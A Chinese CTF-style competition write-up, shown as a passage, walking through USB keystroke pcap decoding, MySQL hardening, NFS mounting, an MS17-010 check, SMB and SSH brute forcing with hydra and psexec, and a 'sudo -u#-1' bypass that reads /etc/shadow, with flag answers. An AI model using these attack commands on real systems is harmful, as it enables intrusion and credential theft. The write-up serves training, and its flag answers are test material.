V7KCVd0cs\n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\n\"\"\"\nc = ''\nfor i in content.split('\\n'):\n    c+=i\nopen('flag.jpeg','wb').write(base64.b64decode(c))\n```\n\n运行后打开得到的jpg文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/P5hiiZMlok9wZrG61710404929.jpeg)\n\n是一个桌面的截图，可以看到有一个文件夹，那这个文件夹名就是这题的答案。\n\n##### FLAG5: Working Folder-Shortcut\n\n\n\n### *编码信息获取（wire0078.pcap USB键盘流量分析）\n\n**任务环境说明：**\n\nü 服务器场景：FTPServer20220509(关闭链接)\n\nü FTP用户名:codeinfoacq密码：codeinfoacq:\n\n#### 1.  从靶机服务器的FTP上下载wire0078.pcap，分析该文件，找出关键信息所属的区域，将区域名称作为Flag进行提交。\n\nwireshark打开文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Brz5t9d2DJYI17131710404929.png)\n\n只有USB的数据，很明显是USB流量分析。\n\n点击任一数据，能够发现数据流：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MNpn5wZzXRooDUpb1710404929.png)\n\n该区域就是关键信息，取前面的字符串即可。\n\n##### FLAG1: Leftover Capture Data\n\n#### 2.  分析该文件，找出关键信息，将有效数据包长度作为Flag进行提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vEDEl00rCmYPUc4e1710404930.png)\n\n##### FLAG2: 8\n\n#### 3.  分析该文件，找出关键信息，将第5条有效信息的关键部分以16进制数值作为Flag进行提交。\n\n**注意这边题目要求是有效信息，那么我们怎么判断信息是否有效呢？**\n\n**键盘流量中，信息中关键的部分是字符串中第3个hex值，比如数据 ```0000090000000000```第3个hex值为 ```09``` ，那么这个值就是关键部分。**\n\n**如果关键部分为 ```00``` 代表的是松开按键，那就是无效信息了，所以依据这个来找不全为0的包。**\n\n所以第5条有效信息并不是第5个包，实际上是第10个包。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zjqmY89zVJauqjKt1710404930.png)\n\n关键部分是 **2f** 那么以16进制数值表示就是 **0x2f**\n\n##### FLAG3: 0x2F\n\n#### 4.  分析该文件，找出关键信息，将第10条有效信息的关键部分以16进制数值作为Flag进行提交。\n\n同理找到第21号流量包是第10条有效信息。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZD4eTsTvn9augH4A1710404930.png)\n\n##### FLAG4: 0x22\n\n#### *5.  分析该文件，找出关键信息，将找到的Flag值进行提交。\n\n###### 分析\n\n这里就是键盘流量还原原内容，想要还原需要以下两步：\n\n- **使用tshark来提取所有有效信息**\n- **根据usb流量的帮助文档来找到关键部分对应的字符串**\n\n###### tshark提取流量包数据\n\n首先使用tshark工具提取流量包数据\n\n```\ntshark -r wire0078.pcap -T fields -e usb.capdata > usbdata.txt\n```\n\n*实际上因为这里流量包总共也就66个包，如果忘记命令可以手动来提取那部分关键数据，然后直接对应文档来还原flag。\n\n这里复盘就来写下脚本。\n\n打开Kali，Kali有tshark工具环境变量。输入这段命令：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qanq8XwRKFfE9ds01710404930.png)\n\n得到了usbdata.txt，关键数据是 **字符串第4-6的部分**\n\n这时候就要用python脚本来处理数据：\n\n```python\nf = open('usbdata.txt')\nfor i in f.readlines():\n    data = i[4:6]\n    shift = i[0:2]\n```\n\n这里提取 **字符串4-6的部分** 作为关键部分。\n\n注意还提取了 **字符串0-2的部分** 这一部分就是判断shift键是否按下，20则代表按下了。所以要**根据shift是否按下**对 对应的字符进行转换。\n\n###### 阅读帮助文档获取关键部分对应的字符串\n\n我们需要阅读题目给的usb流量的帮助文档来找到关键部分对应的字符串。\n\n在文档结尾部分是一个目录，表明了每章标题对应的页码，我们发现 **USB键盘流量在第54页**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Hb5GIzyiz683VPkd1710404930.png)\n\n找到54页，发现了ID对应的字符关系。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/weuAKkn7n5JgTqGy1710404931.png)\n\n**根据HexId来找对应的字符即可。**\n\n这里能发现一个规律，就是**从序号4开始就是26位字母，然后是1234567890十个数字**，有这个规律就可以方便我们写序号对应字符的关系了，只需要一个循环即可。\n\n而且因为最终的答案基本为字母和数字组成，所以这样写就很高效，如果有哪里报错就添加对应的id和字符到字典即可。\n\n```python\ndc = {}\nn = 0\nfor i in range(4,4+26+10): # 4 + 字母表长度 + 数字表长度\n    dc[i] = 'abcdefghijklmnopqrstuvwxyz1234567890'[n]\n    n += 1\n```\n\n###### 最终脚本\n\n*比赛的时候就给了文档，B模块时间又不充裕，所以如果按照标准的键盘流量提取脚本来写 效率会很低，所以这里脚本尽量怎么快怎么来。\n\n根据调试，能发现除了上述添加的字母和数字以外，还有 **45、47、48** 号关键数据没有被添加进去，对照帮助文档能发现分别是 ```- [ ]``` 而它们数据的第一位又是 ```20``` 所以对应的字符应该是 ```_ { }```（即按了shift后按键的结果）\n\n脚本添加这一条件的判断\n\n```python\ndc = {}\nn = 0\nfor i in range(4,4+26+10):\n    dc[i] = 'abcdefghijklmnopqrstuvwxyz1234567890'[n]\n    n += 1\nresult = ''\nf = open('usbdata.txt')\nfor i in f.readlines():\n    data = i[4:6]\n    shift = i[0:2]\n    if data != \"00\":\n        if shift == \"20\":\n            dc[45] = \"_\"\n            dc[47] = \"{\"\n            dc[48] = \"}\"\n            result += dc[int(data,16)].upper()\n        else:\n            dc[45] = \"-\"\n            dc[47] = \"[\"\n            dc[48] = \"]\"\n            result += dc[int(data,16)]\nprint(result)\n```\n\n###### 脚本解析\n\n**脚本先是创建了一个 序号对应字符 关系的一个字典，然后将答案中可能出现的字符和序号添加进去。**\n\n**然后for循环读取tshark生成的usbdata.txt每行数据，截取关键部分和shift按键，如果关键部分为 ```00``` 无效数据则Pass。**\n\n**符合条件的部分会根据首位数据是否为```20```（shift是否按下）进行分别处理，添加可能的字符到字典以及字母大小写处理。**\n\n**然后获取关键部分的ID号对应字符，最后添加到空值。打印空值，得到结果**\n\n\n\n保存这段代码至decode.py，kali python3运行得到FLAG。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vnJhgwIGOOkaiLXn1710404931.png)\n\n##### FLAG5: pr355_0nwards_a2fee6e0\n\n\n\n## 信息收集\n\n\n\n### 数据库安全加固（mysql增改查删）\n\n任务环境说明：\n\t服务器场景：CentOS6.8（用户名：root；密码：123456）\n\t服务器场景操作系统：CentOS6.8\n\n#### 1.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），查看数据库版本号，将查看数据库版本号的命令作为flag提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/3dZVRLpgs2LW3nPS1710404931.png)\n\n##### FLAG1: select version();\n\n#### 2.  进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），查看数据库版本号，将查询到的数据库版本号作为flag提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/ReKZlYCIz3lujbel1710404931.png)\n\n##### FLAG2: 5.1.73\n\n#### 3.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），查看数据库列表，将查看数据库列表的命令作为flag提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/kkpEiADHcJx0dF7E1710404932.png)\n\n##### FLAG3: show databases;\n\n#### 4.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），进入mysql数据库，查看所有用户及权限，找到可以从任意 IP 地址访问的用户，将该用户的用户名作为flag提交；（如有多个可以从任意 IP 地址访问的用户，提交形式为用户名|用户名|用户名|用户名）\n\n任意IP地址访问的用户 即在mysql.user库中**host字段为 %** 的用户\n\n ```mysql\nselect user from mysql.user where host='%'; \n ```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/e2P1c4X66DwjukMR1710404932.png)\n\n##### FLAG4: test\n\n#### 5. 进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），进入mysql数据库，查看所有用户及权限，找到可以从任意 IP 地址访问的用户，使用drop命令将该用户删除，将操作命令作为flag提交。\n\n ```mysql\ndrop user 'USER'@'HOST';\n ```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/R2xnylsIkonDhvLV1710404932.png)\n\n##### FLAG5: drop user 'test'@'%';\n\n#### 6.  进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），进入mysql数据库，改变默认 mysql 管理员的名称，将系统的默认管理员root 改为 admin，防止被列举，将操作命令作为flag提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rjeiOXiRE80tsq921710404932.png)\n\n##### FLAG6: update mysql.user set user='admin' where user='root';\n\n\n\n\n\n### *系统漏洞（showmount查看靶机共享目录）\n\n任务环境说明：\n\t服务器场景名：Web20200529\n\t服务器场景操作系统：未知（关闭链接）\n\t服务器场景用户名：未知\n\n**该题命令较冷门 不常用，建议多记下相关命令。**\n\n#### 1.   通过本地PC中渗透测试平台Kali查看目标靶机共享的目录及IP地址白名单（将IP地址替换为0.0.0.0），将查看命令作为Flag提交；\n\n```c++\nshowmount -e IP //查看靶机共享目录\n```\n\n#####  FLAG1: showmount -e 0.0.0.0\n\n#### 2.   通过本地PC中渗透测试平台Kali 查看目标靶机共享的目录及IP地址白名单，将查看命令执行结果的共享目录作为Flag提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/eKCdRQorYSPiZ1Y41710404932.png)\n\n##### FLAG2: /\n\n#### 3.   通过本地PC中渗透测试平台Kali渗透进入目标靶机，将挂载目标靶机文件系统到本地/mnt的命令（将IP地址替换为0.0.0.0）作为Flag提交；\n\n ```c++\nmount -t nfs 192.168.31.129:/ /mnt // 将第二题的目录远程挂载在/mnt目录\n ```\n\n##### FLAG3: mount -t nfs 0.0.0.0:/ /mnt\n\n#### 4.   通过本地PC中渗透测试平台Kali计算目标靶机磁盘可用空间（以M或G为单位）作为Flag提交；\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/DAmlyFCudG5yJiUp1710404932.png)\n\n##### FLAG4: 4.9G\n\n#### 5.   通过本地PC中渗透测试平台Kali使用“flag.txt”作为关键词搜索靶机文件系统中该文件的位置，并将搜索所需命令作为Flag提交；\n\n ```c++\nfind /mnt -name flag.txt //因为挂载在了/mnt，所以靶机文件都在这个目录下 用find查找下flag.txt\n ```\n\n##### FLAG5: find /mnt -name flag.txt\n\n#### 6. 通过本地PC中渗透测试平台Kali下载flag.txt文件，将文件中的Flag提交；\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/My5m9yOLzcZIWSoV1710404932.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2L1O3OfYGeXEMoIX1710404933.png)\n\n##### FLAG6: fLaG{0001030}\n\n\n\n### 渗透测试（MS17010漏洞验证）\n\n任务环境说明：\n\t服务器场景：Server09\n\t服务器场景操作系统：未知（关闭连接）\n\t系统用户名：administrator密码：123456\n\n#### 1.  通过本地PC中渗透测试平台Kali对靶机场景进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\n```\nnmap -n -sV -oX target 192.168.31.236\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RaDqr3iQxhzstLKF1710404933.png)\n\n##### FLAG1: -oX\n\n#### 2.  在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jDtjdB2RB2Cjpx7t1710404933.png)\n\n##### FLAG2: msfdb init\n\n#### 3.  在本地PC的渗透测试平台Kali中，打开MSF，使用db_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hY3sGPrcH1JSp62y1710404933.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lrPzZeU24V3NprSP1710404934.png)\n\n##### FLAG3: hosts\n\n#### 4.  在MSF工具中用search命令搜索MS17010漏洞利用模块，将回显结果中的漏洞公开时间作为Flag值提交；（如：2017-10-16）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MHDBrEQkKHoecx0R1710404934.png)\n\n##### FLAG4: 2017-03-14\n\n#### 5.  在MSF工具中调用MS17010漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。 \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/c4AruBMB50VQFxsw1710404934.png)\n\n##### FLAG5: vulnerable\n\n\n\n### smb信息收集（smb爆破）\n\n任务环境说明：  \n\n  服务器场景：Server（封闭靶机）\n\n  用户名:administrator密码：未知\n\n无环境\n\n#### 1. 使用暴力破解工具对服务器的服务器信息块协议暴力破解，字典在服务器的网站的首页，将获取的密码作为flag提交； \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JIRg4ouHXOCLiTN31710404934.png)\n\n##### FLAG1: P@ssw0rd\n\n#### 2.  使用访问工具对服务器服务访问，将查看到最后一个共享文件名称作为flag提交；\n\n用得到的smb密码，windows访问。**\\\\\\\\192.168.1.1**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qt3tH8sbWzN5G1gj1710404934.png)\n\n##### FLAG2: flag_is_here\n\n#### 3.  使用访问工具对服务器服务访问，将服务器中管理员桌面的文本文档里的内容作为flag提交；\n\n直接使用msf中的/smb/psexec进：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/NfshYLU3DBhvEcwc1710404934.png)\n\n后面的题目拿到shell直接做即可。\n\n这里flag就是上一题文本打开的内容。\n\n##### FLAG3: FAKE_FLAG\n\n#### 4.  使用访问工具对服务器服务访问，将服务器中DNS2的地址作为flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xH9vuPwxN5wGa42O1710404935.png)\n\n##### FLAG4: 112.211.112.211\n\n#### 5.  使用访问工具对服务器服务访问，将服务器中最后一个用户名作为flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ji40MQMh4NDHrESh1710404935.png)\n\n##### FLAG5: job\n\n#### 6.  使用访问工具对服务器服务访问，将服务器中所有驱动器作为flag提交；\n\n##### FLAG6: C:\\\n\n\n\n### SSH弱口令渗透测试（ssh弱口令爆破）\n\n**任务环境说明：**\n\n\t服务器场景：Linux（关闭链接）\n\t服务器场景操作系统：Linux（版本不详）\n\n#### 1.  在本地PC渗透测试平台Kali中使用zenmap工具扫描服务器场景Linux所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为FLAG提交（忽略ip地址）； \n\n```\nnmap -n -p21,22,23 192.168.31.142\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Vakkb8eI0EJoCNCZ1710404935.png)\n\n##### FLAG1: -p 21,22,23\n\n#### 2.  通过本地PC中渗透测试平台Kali对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中SSH服务对应的服务端口信息作为FLAG提交；\n\n```\nnmap -n -sV 192.168.31.142\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lolegLCucTEU470l1710404935.png)\n\n端口信息不用看扫描结果也可以做的。\n\n##### FLAG2: 22/tcp\n\n#### 3.  在本地PC渗透测试平台Kali中使用MSF模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为FLAG提交； \n\n```\nmsfconsole\nsearch ssh_login\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kjlgxObBnTWNLvXN1710404936.png)\n\n##### FLAG3: auxiliary/scanner/ssh/ssh_login\n\n#### 4.  在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为FLAG提交（之间以英文逗号分隔，例hello,test，..,..）； \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QQKqt9eN6u4t7tLD1710404936.png)\n\n（这里username应该设置为test，打错了。）\n\n##### FLAG4: RHOSTS,PASS_FILE,THREADS,USERNAME\n\n#### 5.  在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为FLAG提交； \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Wk0dfVyTwHwBxqDf1710404936.png)\n\n##### FLAG5: set RHOSTS\n\n#### 6.  在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为test爆破获取密码并将得到的密码作为FLAG提交； \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QxPWPjOOWDcEg9XF1710404936.png)\n\nkali新版的 ```ssh_login``` 爆破模块速度慢很多\n\n使用**hydra**进行爆破速度会快很多\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/J1xSkCvQpO3gKt5E1710404936.png)\n\n##### FLAG6: aaabc3\n\n#### 7.  在上一题的基础上，使用第6题获取到的密码SSH到靶机，将test用户家目录中唯一一个后缀为.bmp图片的文件名的字符串作为FLAG提交。\n\nssh_login得到密码后可以直接用 **sessions -1** 来连接shell 或用ssh连接\n\n```\nssh test@192.168.31.142 //aaabc3\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pS423L8sWxO2QtVk1710404936.png)\n\n##### FLAG7: nauiwrevy\n\n\n\n### *服务器内部信息获取（后门用户爆破+信息收集）\n\n**任务环境说明：**\n\n\t服务器场景：Linux20210510（关闭链接）\n\t用户名:test密码：123456\n\n#### 1.  收集服务器场景中的服务信息。并获取服务器中开放的端口号信息，将服务器端口号作为flag提交（如果有多个端口以;分割，如11;22;33）；\n\n```\nnmap -n -Pn -p- 192.168.31.198\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/omkS454j7ECWUWkb1710404937.png)\n\n##### FLAG1: 22;111;6000\n\n#### 2.  将服务器中tmp文件夹下的字典下载至本地，并将字典中最后一位用户名作为flag提交；\n\n```\nssh test@192.168.31.198 // 123456\n```\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/UaPi49UTXyfOq9hd1710404937.png)\n\n```\ncd /tmp\nls\ncat username.txt\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/oSNNdrz91UMufsl91710404937.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HxBub3fSGo8SLIlL1710404937.png)\n\n下载字典至本地：\n\n```\nscp test@192.168.31.198:/tmp/{username.txt,password.txt} /root\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/706C7EcBxAtRgpEw1710404937.png)\n\n##### FLAG2: nfyHvb\n\n#### 3.  应用工具获取服务器中黑客账户（hacker）的密码。并将黑客的密码作为flag提交；\n\n利用下载的 **password.txt** 来爆破hacker密码\n\n```\nhydra -l hacker -P /root/password.txt ssh://192.168.31.198\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/wFIVt4j7cd7zaWfd1710404937.png)\n\n另外用username.txt和password.txt的组合也能爆破出一个用户的密码\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8L5gFLhf5OdrQMdV1710404938.png)\n\n##### FLAG3: xhm9NG\n\n#### 4.  在服务器中查看sudo软件的版本，将sudo的版本号作为flag提交；\n\n```\nssh hacker@192.168.31.198 // xhm9NG\nsudo -V\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HgSQQSCfLWhq4Gnd1710404938.png)\n\n##### FLAG4: 1.8.23\n\n#### 5.  在服务器中登录恶意用户，查看恶意用户在服务器中输入的第一条指令，将指令作为flag提交；\n\n```\nhistory // 查看当前用户输入的命令\n```\n\n这里题目描述的是 **恶意用户** ，和上面的后门用户有区别。\n\n我分别登录了hacker用户和SZAyUX用户 用 **history** 命令查看命令对比了一下。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5GamU17lX2nmAHpd1710404938.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lOlEvcatiQkMBSkg1710404938.png)\n\n有可能是 **hacker** 用户的命令，提交的时候多试几次就行 这里答案不确定。\n\n##### FLAG5: whoami\n\n#### 6.  在服务器中查看用户信息，将最后一个用户的用户名作为flag提交；\n\n```\ncat /etc/passwd\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3EQyCQBZitaECebp1710404938.png)\n\n这里最后一个用户是空 /etc/passwd这个文件没有记录，那就去/etc/shadow看看，但是尝试cat的时候没有权限：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/W7RsznmRv3XmKMow1710404939.png)\n\n这时候结合上面黑客的history历史记录的第一条命令\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5GamU17lX2nmAHpd1710404938.png)\n\n```\nsudo -u#-1 cat /etc/shadow\n```\n\n执行看看，发现hacker的sudo还是没权限。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OU8KtLYJ5c7lMRch1710404939.png)\n\n那换刚刚的恶意用户来试这条命令\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SagtEfKlAM3oyvBd1710404939.png)\n\n成功执行，找到了最后一个用户\n\n##### FLAG6: Stand_by_me\n\n\n\n## 应急响应\n\n\n\n### *应急响应（日志文件分析）\n\n**任务环境说明：**\n\nü 服务器场景：FTPServer220817\n\nü 服务器场景操作系统：未知（封闭靶机）\n\nü FTP用户名:log密码：log\n\n#### 1.  从靶机服务器的FTP上下载日志文件，分析日志文件，将黑客成功登录系统所使用的IP地址作为Flag值提交；\n\n这里我们是从第二步出发的，知道了，黑客使用的账号，因为我们可以在下面看到他的IP地址，但是这个是有变化，我们查看根据这个账号名查找\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/EBQTj9K3BmEr6Bp21710404939.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5SwrbHGGH8ia3BlU1710404939.png)\n\n然后就发现了172.16.1.1 192.168.36.133 127.0.0.1\n但是这三个都不是,这里我们可通过脚本来把所有ip跑出来，我们另存为1.txt\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VIsgz5WLKM765nEq1710404940.png)\n\n然后我们通过如下脚本将所有疑似ip的都跑出来，包括其他两个日志，经过尝试没有发现正确答案，最后查询解析正确答案是172.168.36.133，和上面的192.168.36.133，十分相似，所以猜测可能是答案搞错了\n\n```python\nimport re\n\nr = 